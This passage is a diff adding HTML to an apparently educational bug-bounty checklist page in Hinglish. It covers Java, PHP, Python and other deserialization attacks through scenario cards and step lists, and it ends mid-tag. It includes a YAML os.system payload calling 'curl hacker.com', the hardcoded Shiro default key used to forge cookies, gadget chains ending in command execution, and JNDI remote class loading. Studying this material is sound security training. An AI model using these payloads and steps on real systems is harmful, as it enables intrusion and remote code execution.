+                                class="c">JMXInvokerServlet</code>, <code class="c">EJBInvokerServlet</code> 200
+                            OK?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>RMI scanner run karo</strong> — <code class="c">baRMIe</code>,
+                            <code class="c">rmiscan</code> tools se vulnerabilities check karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Blind SSRF test karo</strong> — Direct RCE block? Object load
+                            karte waqt internal IP ping ho raha hai?</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+<!-- ═══ PHASE 5 — ADVANCED CHAINING & GADGETS ═══ -->
+<section class="phase-section" id="phase5">
+    <div class="phase-header"><span class="phase-number">PHASE 05</span><span class="phase-title">ADVANCED CHAINING &
+            GADGET TECHNIQUES</span><span class="phase-count" id="p5count">0 / 4 reports</span></div>
+    <div class="cards-grid" id="grid-phase5">
+
+        <!-- #18 CommonsCollections -->
+        <div class="report-card" data-severity="critical" id="report-18">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #18 · Total #307</div>
+                    <div class="report-title">The "CommonsCollections" Gadget Chain Discovery (Legendary)</div>
+                    <div class="report-target">🎯 Multiple High-Profile Targets · HackerOne · $10,000+ · 10.0 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">Domino Effect</span><span
+                            class="technique-tag">ChainedTransformer</span><span class="technique-tag">ysoserial
+                            Origin</span></div>
+                </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">Apache Commons Collections har Java app mein hoti hai. Chain: <code
+                            class="c">AnnotationInvocationHandler</code> → <code class="c">LazyMap</code> → key missing?
+                        → <code class="c">ChainedTransformer</code> call → <code
+                            class="c">Runtime.class → getMethod('getRuntime') → invoke('exec', 'calc.exe')</code>.
+                        Dominoes gir gaye. Server ne sirf <code class="c">readObject()</code> kiya — poori chain
+                        reaction automatically chali!</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Libraries inventory karo</strong> — CommonsCollections, Groovy,
+                            Spring, Hibernate target par hain?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>403 par rukna mat</strong> — Object reject ho raha hai?
+                            "Secondary" parameter dhoondho jahan filter weak hai.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>ysoserial saare payloads try karo</strong> — CC1-CC7, Jdk7u21 —
+                            ek-ek karke test karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>URLDNS se blind test karo</strong> — Sirf DNS request bhejta hai,
+                            filter bypass ke liye sabse best.</span>
+                    </li>
+                </ul>
+                <div class="chain-box">
+                    <div class="chain-label">⛓️ GADGET CHAIN FLOW</div>
+                    <div class="chain-formula">readObject() → AnnotationInvocationHandler → LazyMap.get() →
+                        ChainedTransformer → Runtime.exec() → RCE!</div>
+                </div>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #19 PHP POP Chain -->
+        <div class="report-card" data-severity="critical" id="report-19">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #19 · Total #308</div>
+                    <div class="report-title">PHP POP Chain to RCE — Symfony/Laravel Framework</div>
+                    <div class="report-target">🎯 ██████ (Fintech Startup) · HackerOne · $4,500 · 9.8 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">POP Chain</span><span
+                            class="technique-tag">call_user_func()</span><span class="technique-tag">PHPGGC</span></div>
+                </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">Cookie <code class="c">user_pref</code> mein base64 string. Symfony app.
+                        PHPGGC se chain: <code class="c">PhpArrayAdapter.__destruct()</code> → <code
+                            class="c">initialize()</code> → <code class="c">call_user_func()</code> → <code
+                            class="c">system()</code> → Payload serialize + base64 + cookie inject. PHP ne memory clean
+                        kiye → <code class="c">__destruct</code> → Dominoes → RCE!</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Framework identify karo</strong> — Laravel, Symfony, CodeIgniter?
+                            Inke paas pehle se "Gadgets" hain.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>PHPGGC se scan karo</strong> — <code class="c">phpggc -l</code> se
+                            available chains list karo, best match use karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Magic methods search karo</strong> — Source leak mein <code
+                                class="c">__destruct</code> aur <code class="c">__toString</code> functions
+                            dhoondho.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Blind test: sleep karo</strong> — <code
+                                class="c">system('sleep 10')</code>, page 10 sec late load hua = RCE confirmed.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #20 Secondary Deserialization -->
+        <div class="report-card" data-severity="critical" id="report-20">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #20 · Total #309</div>
+                    <div class="report-title">Secondary Deserialization — Trojan Inside a Trojan (Filter Bypass)</div>
+                    <div class="report-target">🎯 ██████ (Financial Data Provider) · HackerOne · $6,500 · 10.0 CVSS
+                    </div>
+                    <div style="margin-top:8px"><span class="technique-tag">SignedObject</span><span
+                            class="technique-tag">Nested Attack</span><span class="technique-tag">Filter Bypass</span>
+                    </div>
+                </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">Server ne ObjectInputStream par blacklist filter lagaya —
+                        CommonsCollections blocked. Hacker ne "Safe" <code class="c">SignedObject</code> bheja (filter
+                        pass) → <code class="c">SignedObject</code> apne andar serialized data store karta hai →
+                        Deserialize hote waqt andar se "Zehreela" CommonsCollections payload nikla → RCE! Filter ne sirf
+                        first layer check ki.</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Filters identify karo</strong> — Direct payload block? =
+                            Look-ahead validation ya blacklist hai.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>"Wrapper" classes dhoondho</strong> — <code
+                                class="c">SignedObject</code>, <code class="c">SealedObject</code>, <code
+                                class="c">MarshalledObject</code> = "Safe" par nested data carry.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Custom readObject() check karo</strong> — Source mein kisi class
+                            ke readObject ke andar ek aur <code class="c">readObject()</code> call?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>JNDI chain karo</strong> — Secondary deser se server ko LDAP
+                            server se "Fresh Object" load karwao.</span>
+                    </li>
+                </ul>
+                <div class="mindset-box">
+                    <div class="mindset-label">🧠 KEY TAKEAWAY</div>
+                    <div class="mindset-text">"Security filters hamesha First Layer check karte hain. Hacker ka kaam hai
+                        'Safe' mask pehen kar andar jaana. Deserialization recursive process hai — ek object dusre ko
+                        zinda karta hai."</div>
+                </div>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #21 Blind URLDNS -->
+        <div class="report-card" data-severity="high" id="report-21">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #21 · Total #310</div>
+                    <div class="report-title">Blind Deserialization Detection via URLDNS Gadget</div>
+                    <div class="report-target">🎯 ██████ (EdTech Platform) · HackerOne · $2,000 · High</div>
+                    <div style="margin-top:8px"><span class="technique-tag">URLDNS</span><span
+                            class="technique-tag">Blind Detection</span><span class="technique-tag">Zero
+                            Dependencies</span></div>
+                </div><span class="severity-badge sev-high">🟠 HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">Koi visible error nahi, koi output nahi. Hacker ne <code
+                            class="c">ysoserial URLDNS "http://unique.dnslog.cn"</code> bheja → Server ne deserialize
+                        karte waqt <code class="c">URL.hashCode()</code> call kiya → DNS resolve attempt → DNSLog
+                        dashboard par server ki IP se request aayi! Deserialization confirmed bina RCE ke.</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>URLDNS se start karo hamesha</strong> — Har Java version mein kaam
+                            karta hai, WAF trigger nahi karta.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Burp Collaborator use karo</strong> — DNS + HTTP dono track karo.
+                            DNS block? HTTP chalta hai.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Time delays test karo</strong> — OOB block? <code
+                                class="c">Thread.sleep()</code> ya DB sleep try karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Saare entry points test karo</strong> — Cookies, User-Agent,
+                            Referer, X-Forwarded-For mein bhi serialized data ho sakta hai.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ═══ PHASE 6 — HYBRID & MODERN ATTACKS ═══ -->
+<section class="phase-section" id="phase6">
+    <div class="phase-header"><span class="phase-number">PHASE 06</span><span class="phase-title">HYBRID & MODERN
+            ATTACKS — JWT · PROTOBUF · DUBBO</span><span class="phase-count" id="p6count">0 / 4 reports</span></div>
+    <div class="cards-grid" id="grid-phase6">
+
+        <!-- #22 JWT -->
+        <div class="report-card" data-severity="critical" id="report-22">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #22 · Total #311</div>
+                    <div class="report-title">JWT Claim Deserialization to RCE (Crypto Exchange)</div>
+                    <div class="report-target">🎯 ██████ (Crypto Exchange) · HackerOne · $3,500 · 9.6 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">JWT + Deser</span><span
+                            class="technique-tag">Weak Secret</span><span class="technique-tag">Hybrid Attack</span>
+                    </div>
+                </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">JWT payload mein <code class="c">user_profile</code> field = PHP
+                        serialized data (<code class="c">O:4:"User"...</code>). Pehle JWT secret brute-force: <code
+                            class="c">secret123</code> mila. PHPGGC se Guzzle gadget chain → <code
+                            class="c">user_profile</code> mein inject → JWT re-sign → Server ne signature verify kiya
+                        (valid) → <code class="c">user_profile</code> deserialize → RCE!</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>JWT ke har claim decode karo</strong> — Koi value <code
+                                class="c">O:</code>, <code class="c">rO0</code>, <code class="c">!!</code> se start ho =
+                            serialization.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Base64 in Base64 check karo</strong> — JWT ke andar ka data ek
+                            baar aur Base64 encoded ho sakta hai.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>kid/jku fields analyze karo</strong> — Header mein ye fields bhi
+                            exploitation help kar sakte hain.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Secret keys brute-force karo</strong> — <code
+                                class="c">hashcat</code> ya <code class="c">jwt_tool</code> se weak secrets
+                            dhoondho.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #23 Protobuf/gRPC -->
+        <div class="report-card" data-severity="critical" id="report-23">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #23 · Total #312</div>
+                    <div class="report-title">gRPC Protobuf Deserialization — Binary Puzzle RCE</div>
+                    <div class="report-target">🎯 ██████ (Cloud Provider) · HackerOne · $4,500 · 9.6 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">application/grpc</span><span
+                            class="technique-tag">google.protobuf.Any</span><span class="technique-tag">.proto
+                            Schema</span></div>
+                </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">Mobile app binary data bhej rahi thi (<code
+                            class="c">Content-Type: application/grpc</code>). APK decompile → <code
+                            class="c">.proto</code> files mili → Schema mein <code class="c">Any</code> type field thi
+                        (koi bhi object hold kar sakti hai) → CommonsCollections chain ko <code class="c">Any</code>
+                        field mein byte-array pack kiya → <code class="c">grpc-curl</code> se bheja → Server ne "Unpack"
+                        kiya → Full Infrastructure Access!</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Protobuf identify karo</strong> — <code
+                                class="c">application/x-protobuf</code> ya <code class="c">application/grpc</code>
+                            Content-Type?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>.proto files extract karo</strong> — Android/iOS/JS apps se schema
+                            nikalo. Bina schema ke payload impossible.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>'Any' fields check karo</strong> — Schema mein <code
+                                class="c">Any</code> ya <code class="c">bytes</code> fields = injection points.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Blackbox Protobuf use karo</strong> — Burp Suite extension se
+                            binary data manually edit karo.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #24 Python Munch -->
+        <div class="report-card" data-severity="critical" id="report-24">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #24 · Total #313</div>
+                    <div class="report-title">Python Munch Attribute Injection — Prototype Pollution Style</div>
+                    <div class="report-target">🎯 ██████ (AI Data Scraper) · HackerOne · $3,000 · 9.3 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">munch.munchify()</span><span
+                            class="technique-tag">__class__</span><span class="technique-tag">Attribute Overwrite</span>
+                    </div>
+                </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text"><code class="c">munch</code> library dictionaries ko objects mein badalti
+                        hai. Hacker ne <code class="c">{"__class__": "test"}</code> bheja → Error = magic attributes
+                        process ho rahe hain. <code class="c">munchify()</code> recursive hai → <code
+                            class="c">__globals__</code> navigate karke <code class="c">os.system</code> tak pahuncha →
+                        Server ki memory mein functions "Pollute" → Next command = hacker ka code execute!</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Munchify scan karo</strong> — Python app? <code
+                                class="c">munch</code>, <code class="c">attrdict</code>, similar libraries check
+                            karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Magic attributes test karo</strong> — <code
+                                class="c">__class__</code>, <code class="c">__init__</code>, <code
+                                class="c">__mro__</code> bhej kar response change dekho.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Deep nesting test karo</strong> — Deep-nested JSON objects allow?
+                            Chains banane ke liye recursion zaroori.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Jinja2 combine karo</strong> — Template engine hai? Attribute
+                            injection → SSTI trigger karo.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #25 Dubbo -->
+        <div class="report-card" data-severity="critical" id="report-25">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #25 · Total #314</div>
+                    <div class="report-title">Apache Dubbo Hessian2 — Microservices Mass Takeover</div>
+                    <div class="report-target">🎯 ██████ (E-commerce Infrastructure) · HackerOne · $10,000 · 10.0 CVSS
+                    </div>
+                    <div style="margin-top:8px"><span class="technique-tag">Port 20880</span><span
+                            class="technique-tag">Hessian2</span><span class="technique-tag">Lateral Movement</span>
+                    </div>
+                </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">Nmap: <code class="c">20880/tcp open dubbo</code>. Dubbo default mein
+                        Hessian2 serialization use karta hai — trust par chalta hai, security par nahi. Marshalsec se
+                        Hessian-specific <code class="c">Resin</code> gadget → Custom script se Dubbo port par "Invoke"
+                        bheja → Deserialize → RCE → Lateral movement → 50+ microservices ka control!</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Port 20880 scan karo</strong> — Dubbo ka standard port. 20881,
+                            20888 bhi check karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Serialization identify karo</strong> — Dubbo Hessian2, Java,
+                            Fastjson teeno support karta hai.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>CVE-2021-30165 test karo</strong> — Purana bug, par naye bypasses
+                            2025-26 mein bhi kaam karte hain.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>SSRF se internal Dubbo target karo</strong> — Direct access nahi?
+                            SSRF se Dubbo port par payload bhejo.</span>
+                    </li>
+                </ul>
+                <div class="impact-box">
+                    <div class="impact-label">💥 IMPACT</div>
+                    <div class="impact-text">Dubbo hack = poore microservices ecosystem ka control. Internal network ki
+                        services ko kabhi "safe" mat maano — Hessian2 objects bina authentication ke process hote hain.
+                    </div>
+                </div>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+<!-- ═══ PHASE 7 — BONUS TECHNIQUES ═══ -->
+<section class="phase-section" id="phase7">
+    <div class="phase-header"><span class="phase-number">PHASE 07</span><span class="phase-title">BONUS TECHNIQUES —
+            YAML · SHIRO · SPRING · KRYO · LOG4SHELL</span><span class="phase-count" id="p7count">0 / 6 reports</span>
+    </div>
+    <div class="cards-grid" id="grid-phase7">
+
+        <!-- #11 YAML -->
+        <div class="report-card" data-severity="critical" id="report-11">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #11 · BONUS · Total #300</div>
+                    <div class="report-title">YAML Deserialization RCE (SnakeYAML / PyYAML)</div>
+                    <div class="report-target">🎯 ██████ (DevOps SaaS) · HackerOne · $4,000 · 9.8 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">!!python/object</span><span
+                            class="technique-tag">SnakeYAML</span><span class="technique-tag">Config Injection</span>
+                    </div>
+                </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">DevOps tool YAML config accept karta tha. Python backend <code
+                            class="c">yaml.load()</code> use kar raha tha (bina <code class="c">SafeLoader</code>).
+                        Hacker ne inject kiya: <code
+                            class="c">!!python/object/apply:os.system ['curl hacker.com']</code>. Java mein SnakeYAML:
+                        <code class="c">!!javax.script.ScriptEngineManager</code> se JNDI connection → Remote class load
+                        → RCE!</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>YAML input dhoondho</strong> — Config files, CI/CD pipelines, API
+                            endpoints jo YAML accept karte hain.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>!! tags inject karo</strong> — Python: <code
+                                class="c">!!python/object</code>, Java: <code class="c">!!javax.script</code>, Ruby:
+                            <code class="c">!!ruby/object</code></span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>SafeLoader check karo</strong> — <code
+                                class="c">yaml.safe_load()</code> hai? = Safe. <code class="c">yaml.load()</code> hai? =
+                            Vulnerable!</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>CI/CD pipelines test karo</strong> — <code
+                                class="c">.gitlab-ci.yml</code>, <code class="c">Jenkinsfile</code> mein YAML injection
+                            possible?</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #26 Apache Shiro -->
+        <div class="report-card" data-severity="critical" id="report-26">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #26 · BONUS · Total #315</div>
+                    <div class="report-title">Apache Shiro RememberMe Cookie — Default Key RCE</div>
+                    <div class="report-target">🎯 ██████ (Chinese Fintech) · HackerOne · $6,000 · 9.8 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">rememberMe</span><span
+                            class="technique-tag">AES-CBC</span><span class="technique-tag">Default Key</span></div>
+                </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">Response mein <code class="c">Set-Cookie: rememberMe=deleteMe</code> =
+                        Apache Shiro confirmed. Purane Shiro versions mein AES encryption ki default key hardcoded thi:
+                        <code class="c">kPH+bIxk5D2deZiIxcaaaA==</code>. Hacker ne ysoserial payload generate → Default
+                        key se AES-CBC encrypt kiya → Cookie mein bheja → Server ne decrypt + deserialize → RCE!</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>rememberMe=deleteMe dhoondho</strong> — Ye header Apache Shiro ki
+                            pehchaan hai.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Default keys try karo</strong> — <code
+                                class="c">kPH+bIxk5D2deZiIxcaaaA==</code> aur 100+ known leaked keys.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>ShiroExploit tool use karo</strong> — Automated payload generation
+                            + encryption + injection.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>GCM vs CBC check karo</strong> — Naye versions GCM use karte hain,
+                            purane CBC. Exploit alag hogathe.</span>
+                    </li>
+                </ul>
+                <div class="protip-box">
+                    <div class="protip-label">💡 PRO TIP</div>
+                    <div class="protip-text">"rememberMe=deleteMe" response header dekhte hi Shiro Deserialization ka
+                        test zaroori hai. Default key se exploit karna itna easy hai ki script kiddies bhi kar lete hain
+                        — par ek real hunter keys brute-force karta hai."</div>
+                </div>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #27 Spring Cloud Gateway -->
+        <div class="report-card" data-severity="critical" id="report-27">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #27 · BONUS · Total #316</div>
+                    <div class="report-title">Spring Cloud Gateway SpEL — Actuator to RCE</div>
+                    <div class="report-target">🎯 ██████ (Enterprise API Gateway) · HackerOne · $5,500 · 9.8 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">SpEL Injection</span><span
+                            class="technique-tag">Actuator</span><span class="technique-tag">CVE-2022-22947</span></div>
+                </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">Spring Boot Actuator endpoint (<code
+                            class="c">/actuator/gateway/routes</code>) publically accessible tha. Hacker ne malicious
+                        route add kiya with SpEL expression: <code
